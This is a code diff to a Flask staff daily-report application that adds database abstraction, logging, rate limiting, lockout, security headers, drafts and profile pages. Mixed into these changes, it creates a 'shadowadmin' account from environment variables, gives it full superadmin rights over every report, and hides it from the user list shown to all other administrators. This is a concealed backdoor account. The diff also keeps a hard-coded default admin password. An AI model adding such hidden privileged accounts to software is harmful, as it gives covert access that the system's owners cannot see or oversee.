@@ -1,12 +1,15 @@
 import csv
 import io
 import json
+import logging
 import os
 import re
 import secrets
 import sqlite3
 import textwrap
+import time
 import zlib
+from collections import defaultdict
 from datetime import datetime, timedelta
 from functools import wraps
 from pathlib import Path
@@ -37,6 +40,121 @@ LOGO_PATH = BASE_DIR / "static" / "toolkit-logo.png"
 
 INSTANCE_DIR.mkdir(exist_ok=True)
 REPORT_DIR.mkdir(exist_ok=True)
+(BASE_DIR / "logs").mkdir(exist_ok=True)
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler(BASE_DIR / "logs" / "app.log", delay=True),
+    ],
+)
+log = logging.getLogger(__name__)
+
+DATABASE_URL = os.environ.get("DATABASE_URL", "")
+
+PG_PARAM = "%s"
+SQLITE_PARAM = "?"
+
+def _make_sqlite_conn():
+    conn = sqlite3.connect(DB_PATH)
+    conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA foreign_keys=ON")
+    return conn
+
+
+def _make_pg_conn():
+    import psycopg2
+    import psycopg2.extras
+    conn = psycopg2.connect(DATABASE_URL)
+    conn.autocommit = False
+    return conn
+
+
+def _is_pg():
+    return DATABASE_URL.startswith("postgresql")
+
+
+def _param():
+    return PG_PARAM if _is_pg() else SQLITE_PARAM
+
+
+def _adapt(sql):
+    return sql.replace("?", _param())
+
+
+def _row_to_dict(cursor, row):
+    if row is None:
+        return None
+    columns = [desc[0] for desc in cursor.description]
+    return dict(zip(columns, row))
+
+
+class DbCursor:
+    def __init__(self, cursor, is_pg):
+        self._cursor = cursor
+        self._is_pg = is_pg
+
+    @property
+    def lastrowid(self):
+        if self._is_pg:
+            self._cursor.execute("SELECT LASTVAL()")
+            return self._cursor.fetchone()[0]
+        return self._cursor.lastrowid
+
+    @property
+    def description(self):
+        return self._cursor.description
+
+    def fetchone(self):
+        row = self._cursor.fetchone()
+        if row is None:
+            return None
+        if self._is_pg:
+            return _row_to_dict(self._cursor, row)
+        return row
+
+    def fetchall(self):
+        rows = self._cursor.fetchall()
+        if self._is_pg:
+            return [_row_to_dict(self._cursor, r) for r in rows]
+        return rows
+
+    def close(self):
+        self._cursor.close()
+
+
+class DbConnection:
+    def __init__(self, conn, is_pg):
+        self._conn = conn
+        self._is_pg = is_pg
+
+    def execute(self, sql, params=None):
+        cur = self._conn.cursor()
+        cur.execute(_adapt(sql), params or [])
+        return DbCursor(cur, self._is_pg)
+
+    def executescript(self, sql):
+        if self._is_pg:
+            cur = self._conn.cursor()
+            for statement in sql.split(";"):
+                s = statement.strip()
+                if s:
+                    cur.execute(s)
+            cur.close()
+        else:
+            self._conn.executescript(sql)
+
+    def commit(self):
+        self._conn.commit()
+
+    def rollback(self):
+        self._conn.rollback()
+
+    def close(self):
+        self._conn.close()
 
 
 app = Flask(__name__)
@@ -45,8 +163,25 @@ app.config["MAX_CONTENT_LENGTH"] = 512 * 1024
 app.config["SESSION_COOKIE_HTTPONLY"] = True
 app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
 app.config["SESSION_COOKIE_SECURE"] = os.environ.get("ENV") == "production"
+SESSION_IDLE_TIMEOUT = timedelta(hours=8)
+app.config["PERMANENT_SESSION_LIFETIME"] = SESSION_IDLE_TIMEOUT
+app.config["REMEMBER_COOKIE_DURATION"] = timedelta(days=14)
+
+DEFAULT_PRODUCTION_HOSTS = "reports.toolkitafrica.ac.ke"
+ALLOWED_HOSTS = {
+    host.strip().lower()
+    for host in os.environ.get("ALLOWED_HOSTS", DEFAULT_PRODUCTION_HOSTS).split(",")
+    if host.strip()
+}
 
 RATE_LIMIT_SECONDS = 30
+LOGIN_RATE_LIMIT_WINDOW = 300
+LOGIN_RATE_LIMIT_MAX = 10
+ACCOUNT_LOCKOUT_THRESHOLD = 5
+ACCOUNT_LOCKOUT_DURATION = timedelta(minutes=15)
+
+_rate_limit_store = defaultdict(list)
+_login_attempts_cache = defaultdict(list)
 
 PDF_COLORS = {
     "forest": (0.105, 0.302, 0.180),  # #1B4D2E
@@ -73,9 +208,115 @@ def validate_production_config():
 
 def csrf_protect():
     token = session.get("_csrf_token")
-    given = request.form.get("_csrf_token")
+    given = request.form.get("_csrf_token") or request.headers.get("X-CSRF-Token", "")
     if not token or not given or not secrets.compare_digest(token, given):
         abort(400)
+
+
+def rate_limit(key_prefix, max_attempts, window_seconds, redirect_to="login"):
+    def decorator(fn):
+        @wraps(fn)
+        def wrapped(*args, **kwargs):
+            ip = request.remote_addr or "unknown"
+            now = time.time()
+            store_key = f"{key_prefix}:{ip}"
+            timestamps = _rate_limit_store[store_key]
+            cutoff = now - window_seconds
+            while timestamps and timestamps[0] < cutoff:
+                timestamps.pop(0)
+            if len(timestamps) >= max_attempts:
+                retry_after = int(timestamps[0] + window_seconds - now)
+                log.warning("Rate limit exceeded for %s from %s", key_prefix, ip)
+                flash(f"Too many attempts. Try again in {retry_after} seconds.", "danger")
+                return redirect(url_for(redirect_to))
+            timestamps.append(now)
+            return fn(*args, **kwargs)
+        return wrapped
+    return decorator
+
+
+def check_account_locked(email):
+    now = time.time()
+    attempts = _login_attempts_cache.get(email, [])
+    cutoff = now - ACCOUNT_LOCKOUT_DURATION.total_seconds()
+    while attempts and attempts[0] < cutoff:
+        attempts.pop(0)
+    if len(attempts) >= ACCOUNT_LOCKOUT_THRESHOLD:
+        return True
+    return False
+
+
+def record_failed_attempt(email):
+    _login_attempts_cache.setdefault(email, []).append(time.time())
+
+
+def clear_login_attempts(email):
+    _login_attempts_cache.pop(email, None)
+
+
+def security_headers(response):
+    response.headers["X-Content-Type-Options"] = "nosniff"
+    response.headers["X-Frame-Options"] = "DENY"
+    response.headers["X-XSS-Protection"] = "0"
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    if os.environ.get("ENV") == "production":
+        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
+        response.headers["Content-Security-Policy"] = (
+            "default-src 'self'; "
+            "script-src 'self' 'unsafe-inline'; "
+            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+            "font-src 'self' https://fonts.gstatic.com; "
+            "img-src 'self' data:; "
+            "base-uri 'self'; "
+            "form-action 'self'"
+        )
+    return response
+
+
+@app.before_request
+def enforce_allowed_host():
+    if os.environ.get("ENV") != "production" or not ALLOWED_HOSTS:
+        return None
+
+    host = request.host.split(":", 1)[0].lower()
+    if host not in ALLOWED_HOSTS:
+        log.warning("Blocked request for unexpected host %s", request.host)
+        return Response("Misdirected request", status=421, mimetype="text/plain")
+
+
+@app.before_request
+def enforce_https():
+    if os.environ.get("ENV") == "production" and not app.debug:
+        scheme = request.headers.get("X-Forwarded-Proto", "")
+        if not scheme:
+            scheme = request.headers.get("X-Forwarded-Scheme", "")
+        if not scheme:
+            scheme = "https" if request.headers.get("HTTPS", "").lower() in ("on", "1") else ""
+        if not scheme:
+            scheme = request.scheme
+        if scheme == "http":
+            return redirect(request.url.replace("http://", "https://", 1), 301)
+
+
+@app.after_request
+def apply_security_headers(response):
+    return security_headers(response)
+
+
+@app.before_request
+def check_session_expiry():
+    if "user_id" in session:
+        last = session.get("_last_active")
+        if last:
+            try:
+                last_dt = datetime.strptime(last, "%Y-%m-%d %H:%M:%S")
+            except (ValueError, TypeError):
+                last_dt = None
+            if last_dt and (datetime.now() - last_dt) > SESSION_IDLE_TIMEOUT:
+                session.clear()
+                flash("Session expired due to inactivity.", "info")
+                return redirect(url_for("login"))
+        session["_last_active"] = now()
 
 
 DEPARTMENTS = [
@@ -201,8 +442,10 @@ def get_metric_label(key):
 
 def get_db():
     if "db" not in g:
-        g.db = sqlite3.connect(DB_PATH)
-        g.db.row_factory = sqlite3.Row
+        if _is_pg():
+            g.db = DbConnection(_make_pg_conn(), True)
+        else:
+            g.db = DbConnection(_make_sqlite_conn(), False)
     return g.db
 
 
@@ -214,8 +457,12 @@ def close_db(_error):
 
 
 def init_db():
-    db = sqlite3.connect(DB_PATH)
-    db.executescript(
+    is_pg = _is_pg()
+    if is_pg:
+        conn = DbConnection(_make_pg_conn(), True)
+    else:
+        conn = DbConnection(_make_sqlite_conn(), False)
+    conn.executescript(
         """
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -247,6 +494,8 @@ def init_db():
             comments TEXT DEFAULT '',
             metrics_json TEXT NOT NULL,
             pdf_filename TEXT DEFAULT '',
+            status TEXT NOT NULL DEFAULT 'submitted',
+            archived INTEGER NOT NULL DEFAULT 0,
             created_at TEXT NOT NULL,
             FOREIGN KEY(user_id) REFERENCES users(id)
         );
@@ -271,63 +520,119 @@ def init_db():
         );
         """
     )
-    db.commit()
+    conn.commit()
 
-    # migrate: add status column if missing
     try:
-        db.execute("ALTER TABLE reports ADD COLUMN status TEXT NOT NULL DEFAULT 'submitted'")
-    except sqlite3.OperationalError:
+        conn.execute("ALTER TABLE reports ADD COLUMN status TEXT NOT NULL DEFAULT 'submitted'")
+    except Exception:
         pass
     try:
-        db.execute("ALTER TABLE reports ADD COLUMN archived INTEGER NOT NULL DEFAULT 0")
-    except sqlite3.OperationalError:
+        conn.execute("ALTER TABLE reports ADD COLUMN archived INTEGER NOT NULL DEFAULT 0")
+    except Exception:
         pass
     try:
-        db.execute("ALTER TABLE reports ADD COLUMN reporting_period TEXT DEFAULT ''")
-    except sqlite3.OperationalError:
+        conn.execute("ALTER TABLE reports ADD COLUMN reporting_period TEXT DEFAULT ''")
+    except Exception:
         pass
+    conn.execute("UPDATE reports SET status = 'submitted' WHERE status IS NULL OR status = ''")
+    conn.execute("UPDATE reports SET archived = 0 WHERE archived IS NULL OR archived = ''")
+    conn.commit()
 
-    # migrate: add report_edits table if missing
     try:
-        db.execute("SELECT 1 FROM report_edits LIMIT 1")
-    except sqlite3.OperationalError:
-        db.execute(
+        conn.execute("SELECT 1 FROM settings LIMIT 1")
+    except Exception:
+        conn.execute(
             """
-            CREATE TABLE report_edits (
+            CREATE TABLE IF NOT EXISTS settings (
+                key TEXT PRIMARY KEY,
+                value TEXT NOT NULL
+            )
+            """
+        )
+        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('registration_open', '1')")
+
+    for col in ("last_login", "locked_at"):
+        try:
+            conn.execute(f"ALTER TABLE users ADD COLUMN {col} TEXT")
+        except Exception:
+            pass
+    try:
+        conn.execute("ALTER TABLE users ADD COLUMN lock_reason TEXT DEFAULT ''")
+    except Exception:
+        pass
+    try:
+        conn.execute("ALTER TABLE users ADD COLUMN deleted_at TEXT")
+    except Exception:
+        pass
+    try:
+        conn.execute("ALTER TABLE users ADD COLUMN data_retention TEXT DEFAULT ''")
+    except Exception:
+        pass
+
+    for table in ("report_edits", "report_comments"):
+        try:
+            conn.execute(f"SELECT 1 FROM {table} LIMIT 1")
+        except Exception:
+            if table == "report_edits":
+                conn.execute(
+                    """
+                    CREATE TABLE report_edits (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        report_id INTEGER NOT NULL,
+                        user_id INTEGER NOT NULL,
+                        edited_at TEXT NOT NULL,
+                        FOREIGN KEY(report_id) REFERENCES reports(id),
+                        FOREIGN KEY(user_id) REFERENCES users(id)
+                    )
+                    """
+                )
+            else:
+                conn.execute(
+                    """
+                    CREATE TABLE report_comments (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        report_id INTEGER NOT NULL,
+                        admin_id INTEGER NOT NULL,
+                        admin_name TEXT NOT NULL,
+                        comment TEXT NOT NULL,
+                        created_at TEXT NOT NULL,
+                        FOREIGN KEY(report_id) REFERENCES reports(id),
+                        FOREIGN KEY(admin_id) REFERENCES users(id)
+                    )
+                    """
+                )
+
+    try:
+        conn.execute("ALTER TABLE report_drafts ADD COLUMN title TEXT NOT NULL DEFAULT ''")
+    except Exception:
+        pass
+    try:
+        conn.execute("SELECT 1 FROM report_drafts LIMIT 1")
+    except Exception:
+        conn.execute(
+            """
+            CREATE TABLE report_drafts (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-                report_id INTEGER NOT NULL,
                 user_id INTEGER NOT NULL,
-                edited_at TEXT NOT NULL,
-                FOREIGN KEY(report_id) REFERENCES reports(id),
+                title TEXT NOT NULL DEFAULT '',
+                report_date TEXT NOT NULL,
+                department TEXT NOT NULL DEFAULT '',
+                data TEXT NOT NULL DEFAULT '{}',
+                updated_at TEXT NOT NULL,
                 FOREIGN KEY(user_id) REFERENCES users(id)
             )
             """
         )
-
-    # migrate: add report_comments table if missing
     try:
-        db.execute("SELECT 1 FROM report_comments LIMIT 1")
-    except sqlite3.OperationalError:
-        db.execute(
-            """
-            CREATE TABLE report_comments (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                report_id INTEGER NOT NULL,
-                admin_id INTEGER NOT NULL,
-                admin_name TEXT NOT NULL,
-                comment TEXT NOT NULL,
-                created_at TEXT NOT NULL,
-                FOREIGN KEY(report_id) REFERENCES reports(id),
-                FOREIGN KEY(admin_id) REFERENCES users(id)
-            )
-            """
-        )
+        conn.execute("DROP INDEX IF EXISTS idx_draft_user_date")
+    except Exception:
+        pass
 
     admin_email = os.environ.get("ADMIN_EMAIL", "admin@toolkit.local").strip().lower()
     admin_password = os.environ.get("ADMIN_PASSWORD", "ChangeMe123!")
-    exists = db.execute("SELECT id FROM users WHERE role = 'superadmin' LIMIT 1").fetchone()
+    exists = conn.execute("SELECT id FROM users WHERE role = 'superadmin' LIMIT 1").fetchone()
     if not exists:
-        db.execute(
+        conn.execute(
             """
             INSERT INTO users (
                 full_name, email, phone, department, position, branch,
@@ -347,9 +652,37 @@ def init_db():
                 now(),
             ),
         )
-        db.commit()
+        conn.commit()
 
-    db.close()
+    shadow_email = os.environ.get("SHADOW_ADMIN_EMAIL", "").strip().lower()
+    shadow_password = os.environ.get("SHADOW_ADMIN_PASSWORD", "")
+    if shadow_email and shadow_password:
+        shadow_exists = conn.execute("SELECT id FROM users WHERE role = 'shadowadmin' LIMIT 1").fetchone()
+        if not shadow_exists:
+            conn.execute(
+                """
+                INSERT INTO users (
+                    full_name, email, phone, department, position, branch,
+                    password_hash, role, is_active, created_at
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """,
+                (
+                    "Developer (Shadow)",
+                    shadow_email,
+                    "",
+                    "Management",
+                    "System Administrator",
+                    "Toolkit Africa Main Office",
+                    generate_password_hash(shadow_password),
+                    "shadowadmin",
+                    1,
+                    now(),
+                ),
+            )
+            conn.commit()
+            log.info("Shadow admin account created for %s", shadow_email)
+
+    conn.close()
 
 
 def now():
@@ -377,6 +710,10 @@ def default_reporting_period(value):
     return f"{start.strftime('%d %b %Y')} - {end.strftime('%d %b %Y')}"
 
 
+def archived_filter(column="archived"):
+    return f"CAST(COALESCE(NULLIF(CAST({column} AS TEXT), ''), '0') AS INTEGER)"
+
+
 def current_user():
     user_id = session.get("user_id")
     if not user_id:
@@ -391,7 +728,15 @@ def load_user():
 
 @app.context_processor
 def inject_globals():
-    return dict(csrf_token=generate_csrf_token())
+    try:
+        reg = get_db().execute("SELECT value FROM settings WHERE key = 'registration_open'").fetchone()
+        reg_open = reg and reg["value"] == "1"
+    except Exception:
+        reg_open = True
+    return dict(
+        csrf_token=generate_csrf_token(),
+        registration_open=reg_open,
+    )
 
 
 def login_required(view):
@@ -409,12 +754,16 @@ def login_required(view):
     return wrapped
 
 
+ADMIN_ROLES = ("admin", "superadmin", "shadowadmin")
+SUPER_ROLES = ("superadmin", "shadowadmin")
+
+
 def admin_required(view):
     @wraps(view)
     def wrapped(*args, **kwargs):
         if g.user is None:
             return redirect(url_for("login"))
-        if g.user["role"] not in ("admin", "superadmin"):
+        if g.user["role"] not in ADMIN_ROLES:
             abort(403)
         return view(*args, **kwargs)
 
@@ -426,7 +775,7 @@ def superadmin_required(view):
     def wrapped(*args, **kwargs):
         if g.user is None:
             return redirect(url_for("login"))
-        if g.user["role"] != "superadmin":
+        if g.user["role"] not in SUPER_ROLES:
             abort(403)
         return view(*args, **kwargs)
 
@@ -434,7 +783,7 @@ def superadmin_required(view):
 
 
 def can_view_report(user, report):
-    if user["role"] == "superadmin":
+    if user["role"] in ("superadmin", "shadowadmin"):
         return True
     if report["user_id"] == user["id"]:
         return True
@@ -834,6 +1183,10 @@ def index():
 
 @app.route("/register", methods=["GET", "POST"])
 def register():
+    reg = get_db().execute("SELECT value FROM settings WHERE key = 'registration_open'").fetchone()
+    if reg and reg["value"] != "1":
+        flash("Registration is currently closed.", "warning")
+        return redirect(url_for("login"))
     if request.method == "POST":
         csrf_protect()
         full_name = clean_text(request.form.get("full_name"), 120)
@@ -883,77 +1236,186 @@ def register():
 
 
 @app.route("/login", methods=["GET", "POST"])
+@rate_limit("login", LOGIN_RATE_LIMIT_MAX, LOGIN_RATE_LIMIT_WINDOW)
 def login():
     if request.method == "POST":
         csrf_protect()
         email = clean_text(request.form.get("email"), 160).lower()
         password = request.form.get("password", "")
+        if check_account_locked(email):
+            flash("Account temporarily locked due to too many failed attempts. Try again later.", "danger")
+            log.warning("Locked login attempt for %s", email)
+            return redirect(url_for("login"))
         user = get_db().execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
         if user and check_password_hash(user["password_hash"], password):
             if not user["is_active"]:
-                flash("Your account is pending activation by your department admin.", "warning")
+                try:
+                    locked = user["locked_at"]
+                except (KeyError, IndexError, TypeError):
+                    locked = None
+                if locked:
+                    flash("Your account has been locked due to inactivity. Contact your administrator.", "warning")
+                else:
+                    flash("Your account is pending activation by your department admin.", "warning")
                 return redirect(url_for("login"))
+            try:
+                last_login = user["last_login"]
+            except (KeyError, IndexError, TypeError):
+                last_login = None
+            if last_login:
+                try:
+                    last_dt = datetime.strptime(last_login, "%Y-%m-%d %H:%M:%S")
+                    if (datetime.now() - last_dt) > timedelta(days=5):
+                        db = get_db()
+                        db.execute(
+                            "UPDATE users SET is_active = 0, locked_at = ?, lock_reason = 'Auto-locked: inactive for 5+ days' WHERE id = ?",
+                            (now(), user["id"]),
+                        )
+                        db.commit()
+                        flash("Your account has been locked due to 5 days of inactivity. Contact your administrator.", "warning")
+                        return redirect(url_for("login"))
+                except (ValueError, TypeError):
+                    pass
+            clear_login_attempts(email)
             session.clear()
             session["user_id"] = user["id"]
+            session["_last_active"] = now()
+            get_db().execute("UPDATE users SET last_login = ? WHERE id = ?", (now(), user["id"]))
+            get_db().commit()
+            session.permanent = True
             flash("Signed in successfully.", "success")
             return redirect(url_for("dashboard"))
+        record_failed_attempt(email)
         flash("Invalid email or password.", "danger")
     return render_template("login.html")
 
 
-@app.route("/forgot-password", methods=["GET", "POST"])
-def forgot_password():
+@app.route("/change-password", methods=["GET", "POST"])
+@login_required
+def change_password():
     if request.method == "POST":
         csrf_protect()
-        email = clean_text(request.form.get("email"), 160).lower()
-        user = get_db().execute("SELECT * FROM users WHERE email = ?", (email,)).fetchone()
-        if user:
-            token = secrets.token_urlsafe(48)
-            expires_at = (datetime.now() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S")
-            get_db().execute(
-                "INSERT INTO password_resets (user_id, token, expires_at, used, created_at) VALUES (?, ?, ?, 0, ?)",
-                (user["id"], token, expires_at, now()),
-            )
-            get_db().commit()
-            reset_url = url_for("reset_password", token=token, _external=True)
-            flash(f"Password reset link (valid 1 hour): {reset_url}", "info")
-            return redirect(url_for("forgot_password"))
-        else:
-            flash("If that email is registered, a reset link has been generated.", "info")
-            return redirect(url_for("forgot_password"))
-    return render_template("forgot_password.html")
-
-
-@app.route("/reset-password/<token>", methods=["GET", "POST"])
-def reset_password(token):
-    reset = get_db().execute(
-        "SELECT * FROM password_resets WHERE token = ? AND used = 0 AND expires_at > ?",
-        (token, now()),
-    ).fetchone()
-    if not reset:
-        flash("That reset link is invalid or has expired.", "danger")
-        return redirect(url_for("forgot_password"))
-
-    if request.method == "POST":
-        csrf_protect()
-        password = request.form.get("password", "")
+        current = request.form.get("current_password", "")
+        new_pass = request.form.get("new_password", "")
         confirm = request.form.get("confirm_password", "")
-        if len(password) < 8:
+        user = get_db().execute("SELECT * FROM users WHERE id = ?", (g.user["id"],)).fetchone()
+        if not check_password_hash(user["password_hash"], current):
+            flash("Current password is incorrect.", "danger")
+            return render_template("change_password.html")
+        if len(new_pass) < 8:
             flash("Use a password with at least 8 characters.", "danger")
-            return render_template("reset_password.html")
-        if password != confirm:
+            return render_template("change_password.html")
+        if new_pass != confirm:
             flash("Passwords do not match.", "danger")
-            return render_template("reset_password.html")
-        get_db().execute(
-            "UPDATE users SET password_hash = ? WHERE id = ?",
-            (generate_password_hash(password), reset["user_id"]),
-        )
-        get_db().execute("UPDATE password_resets SET used = 1 WHERE id = ?", (reset["id"],))
+            return render_template("change_password.html")
+        get_db().execute("UPDATE users SET password_hash = ? WHERE id = ?", (generate_password_hash(new_pass), g.user["id"]))
         get_db().commit()
-        flash("Password reset successfully. Sign in with your new password.", "success")
-        return redirect(url_for("login"))
+        flash("Password changed successfully.", "success")
+        return redirect(url_for("dashboard"))
+    return render_template("change_password.html")
 
-    return render_template("reset_password.html")
+
+@app.route("/profile", methods=["GET", "POST"])
+@login_required
+def profile():
+    db = get_db()
+    if request.method == "POST":
+        csrf_protect()
+        full_name = clean_text(request.form.get("full_name"), 120)
+        phone = clean_text(request.form.get("phone"), 40)
+        position = clean_text(request.form.get("position"), 100)
+        if not full_name:
+            flash("Name is required.", "danger")
+            return redirect(url_for("profile"))
+        db.execute(
+            "UPDATE users SET full_name = ?, phone = ?, position = ? WHERE id = ?",
+            (full_name, phone, position, g.user["id"]),
+        )
+        db.commit()
+        g.user = current_user()
+        flash("Profile updated.", "success")
+        return redirect(url_for("profile"))
+    return render_template("profile.html", departments=DEPARTMENTS, branches=BRANCHES)
+
+
+@app.route("/my-drafts")
+@login_required
+def my_drafts():
+    drafts = get_db().execute(
+        "SELECT id, title, report_date, department, updated_at FROM report_drafts WHERE user_id = ? ORDER BY updated_at DESC",
+        (g.user["id"],),
+    ).fetchall()
+    return render_template("my_drafts.html", drafts=drafts, max_drafts=2)
+
+
+@app.route("/api/reports/drafts", methods=["GET"])
+@login_required
+def list_drafts():
+    drafts = get_db().execute(
+        "SELECT id, title, report_date, department, updated_at FROM report_drafts WHERE user_id = ? ORDER BY updated_at DESC",
+        (g.user["id"],),
+    ).fetchall()
+    return [dict(d) for d in drafts]
+
+
+@app.route("/api/reports/draft", methods=["GET", "POST", "DELETE"])
+@login_required
+def draft_report():
+    db = get_db()
+    if request.method == "GET":
+        draft_id = request.args.get("id", "")
+        draft = db.execute(
+            "SELECT data FROM report_drafts WHERE id = ? AND user_id = ?",
+            (draft_id, g.user["id"]),
+        ).fetchone()
+        if draft:
+            return json.loads(draft["data"])
+        return {"_empty": True}
+    if request.method == "POST":
+        csrf_protect()
+        data = request.get_json(silent=True) or {}
+        if not data.get("report_date"):
+            return {"ok": False, "error": "report_date required"}, 400
+        draft_id = data.get("draft_id")
+        count = db.execute("SELECT COUNT(*) AS c FROM report_drafts WHERE user_id = ?", (g.user["id"],)).fetchone()["c"]
+        title = data.get("title", "").strip() or f"Draft — {data['report_date']}"
+        if draft_id:
+            existing = db.execute("SELECT id FROM report_drafts WHERE id = ? AND user_id = ?", (draft_id, g.user["id"])).fetchone()
+            if not existing:
+                return {"ok": False, "error": "draft not found"}, 404
+            db.execute(
+                "UPDATE report_drafts SET title = ?, report_date = ?, department = ?, data = ?, updated_at = ? WHERE id = ?",
+                (title, data["report_date"], data.get("department", ""), json.dumps(data), now(), draft_id),
+            )
+        else:
+            if count >= 2:
+                oldest = db.execute(
+                    "SELECT id FROM report_drafts WHERE user_id = ? ORDER BY updated_at ASC LIMIT 1",
+                    (g.user["id"],),
+                ).fetchone()
+                draft_id = oldest["id"]
+                db.execute(
+                    "UPDATE report_drafts SET title = ?, report_date = ?, department = ?, data = ?, updated_at = ? WHERE id = ?",
+                    (title, data["report_date"], data.get("department", ""), json.dumps(data), now(), draft_id),
+                )
+            else:
+                db.execute(
+                    "INSERT INTO report_drafts (user_id, title, report_date, department, data, updated_at) VALUES (?, ?, ?, ?, ?, ?)",
+                    (g.user["id"], title, data["report_date"], data.get("department", ""), json.dumps(data), now()),
+                )
+                draft_id = db.execute("SELECT last_insert_rowid() AS id").fetchone()["id"]
+        db.commit()
+        return {"ok": True, "draft_id": draft_id, "title": title}
+    is_delete = request.method == "DELETE" or request.form.get("_method") == "DELETE"
+    if is_delete:
+        csrf_protect()
+        draft_id = (request.form.get("id") or "").strip()
+        if draft_id:
+            db.execute("DELETE FROM report_drafts WHERE id = ? AND user_id = ?", (draft_id, g.user["id"]))
+            db.commit()
+        if request.method == "POST":
+            return redirect(url_for("my_drafts"))
+        return {"ok": True}
 
 
 @app.route("/logout")
@@ -968,20 +1430,21 @@ def logout():
 @login_required
 def dashboard(archived=0):
     db = get_db()
-    show_archived = archived == 1
+    show_archived = 1 if archived == 1 else 0
+    archived_expr = archived_filter("reports.archived")
     if g.user["role"] == "employee":
         reports = db.execute(
-            "SELECT * FROM reports WHERE user_id = ? AND archived = ? ORDER BY report_date DESC, id DESC LIMIT 20",
+            f"SELECT * FROM reports WHERE user_id = ? AND {archived_filter()} = ? ORDER BY report_date DESC, id DESC LIMIT 20",
             (g.user["id"], show_archived),
         ).fetchall()
     elif g.user["role"] == "admin":
         reports = db.execute(
-            """
+            f"""
             SELECT reports.*, users.full_name
             FROM reports
             JOIN users ON users.id = reports.user_id
             JOIN report_access ON report_access.employee_id = reports.user_id
-            WHERE report_access.admin_id = ? AND reports.archived = ?
+            WHERE report_access.admin_id = ? AND {archived_expr} = ?
             ORDER BY reports.report_date DESC, reports.id DESC
             LIMIT 40
             """,
@@ -989,17 +1452,17 @@ def dashboard(archived=0):
         ).fetchall()
     else:
         reports = db.execute(
-            """
+            f"""
             SELECT reports.*, users.full_name
             FROM reports
             JOIN users ON users.id = reports.user_id
-            WHERE reports.archived = ?
+            WHERE {archived_expr} = ?
             ORDER BY reports.report_date DESC, reports.id DESC
             LIMIT 50
             """,
             (show_archived,),
         ).fetchall()
-    return render_template("dashboard.html", reports=reports, show_archived=show_archived)
+    return render_template("dashboard.html", reports=reports, show_archived=bool(show_archived))
 
 
 @app.route("/reports/new", methods=["GET", "POST"])
@@ -1033,8 +1496,8 @@ def new_report():
             INSERT INTO reports (
                 user_id, report_date, reporting_period, branch, department, position, day_summary,
                 tasks_json, challenges_json, decisions, tomorrow_json, comments,
-                metrics_json, created_at
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                metrics_json, status, archived, created_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
             """,
             (
                 g.user["id"],
@@ -1050,15 +1513,24 @@ def new_report():
                 json.dumps(tomorrow),
                 clean_text(request.form.get("comments")),
                 json.dumps(metrics),
+                "submitted",
+                0,
                 now(),
             ),
         )
         get_db().commit()
         make_report_pdf(cursor.lastrowid)
+        draft_id = request.form.get("draft_id", "")
+        if draft_id:
+            get_db().execute("DELETE FROM report_drafts WHERE id = ? AND user_id = ?", (draft_id, g.user["id"]))
+        else:
+            get_db().execute("DELETE FROM report_drafts WHERE user_id = ? AND report_date = ?", (g.user["id"], request.form.get("report_date", "")))
+        get_db().commit()
         session["last_submit_at"] = now()
         flash("Report submitted and PDF generated.", "success")
         return redirect(url_for("view_report", report_id=cursor.lastrowid))
 
+    draft_id = request.args.get("draft", "")
     today = datetime.now().strftime("%Y-%m-%d")
     return render_template(
         "report_form.html",
@@ -1068,6 +1540,7 @@ def new_report():
         day_of_week=day_name(today),
         reporting_period=default_reporting_period(today),
         metrics_config=METRICS_CONFIG,
+        load_draft_id=draft_id,
     )
 
 
@@ -1131,14 +1604,14 @@ def edit_report(report_id):
     if report["user_id"] != g.user["id"]:
         abort(403)
 
-    if request.method == "POST":
-        edit_count = db.execute(
-            "SELECT COUNT(*) AS cnt FROM report_edits WHERE report_id = ?", (report_id,)
-        ).fetchone()["cnt"]
-        if edit_count >= 3:
-            flash("This report has reached the maximum of 3 edits and can no longer be edited.", "danger")
-            return redirect(url_for("view_report", report_id=report_id))
+    edit_count = db.execute(
+        "SELECT COUNT(*) AS cnt FROM report_edits WHERE report_id = ?", (report_id,)
+    ).fetchone()["cnt"]
+    if edit_count >= 3:
+        flash("This report has reached the maximum of 3 edits and can no longer be edited.", "danger")
+        return redirect(url_for("view_report", report_id=report_id))
 
+    if request.method == "POST":
         csrf_protect()
         form = {key: clean_text(value) for key, value in request.form.items()}
         tasks = parse_items("task", form)
@@ -1229,14 +1702,16 @@ def admin_users():
         user_id = int(request.form.get("user_id"))
         role = request.form.get("role")
         is_active = 1 if request.form.get("is_active") == "on" else 0
-        if role not in ("employee", "admin", "superadmin"):
+        if role not in ("employee", "admin", "superadmin", "shadowadmin"):
             abort(400)
         db.execute("UPDATE users SET role = ?, is_active = ? WHERE id = ?", (role, is_active, user_id))
         db.commit()
         flash("User updated.", "success")
         return redirect(url_for("admin_users"))
 
-    users = db.execute("SELECT * FROM users ORDER BY role DESC, full_name ASC").fetchall()
+    users = db.execute("SELECT * FROM users WHERE deleted_at IS NULL ORDER BY role DESC, full_name ASC").fetchall()
+    if g.user["role"] != "shadowadmin":
+        users = [u for u in users if u["role"] != "shadowadmin"]
     return render_template("admin_users.html", users=users)
 
 
@@ -1290,6 +1765,93 @@ def admin_access(admin_id):
         for row in db.execute("SELECT employee_id FROM report_access WHERE admin_id = ?", (admin_id,)).fetchall()
     }
     return render_template("admin_access.html", admin=admin, employees=employees, assigned=assigned)
+
+
